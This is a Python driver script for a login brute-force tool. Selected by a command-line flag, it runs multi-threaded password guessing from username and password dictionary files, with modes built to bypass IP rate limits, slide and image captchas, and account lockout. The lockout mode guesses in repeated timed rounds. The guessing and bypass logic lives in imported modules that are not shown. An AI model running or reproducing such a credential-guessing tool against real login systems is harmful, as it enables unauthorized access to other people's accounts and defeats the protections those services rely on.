import sys
from bruteforce import bruteforce

from simple import login
from limitip import login_bypass_ip_limit
from slidecaptcha import login_slide
from block_account_bypass import login_limit_user,print_result
from captcha import login_captcha

import utils
import settings
import time

def init_dict():
    # args = utils.get_parse()
    args = dict()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")

    utils.get_dict(dict_username, dict_password)
    return dict_username,dict_password

if __name__ == "__main__":
    if len(sys.argv)>1:
        if sys.argv[1] == 'i':
            # ip limit
            init_dict()
            bruteforce(login_bypass_ip_limit, thread_num=5)
        elif sys.argv[1] == 's':
            # slide captcha
            init_dict()
            bruteforce(login_slide, thread_num=1)
        elif sys.argv[1] == 'u':
            # user limit
            dict_username,dict_password = init_dict()
            for curr_round in range(0, settings.MAX_ROUND):
                print("[INFO] 开始第{0}轮爆破".format(curr_round))
                utils.get_dict(dict_username, dict_password)
                bruteforce(login_limit_user, thread_num=5)
                print("[INFO] Sleep.")
                time.sleep(2)

            print_result()
        elif sys.argv[1] == 'c':
            # picture captcha
            init_dict()
            bruteforce(login_captcha, thread_num=1)

    else:
        # simple login
        init_dict()
        bruteforce(login, thread_num=5)

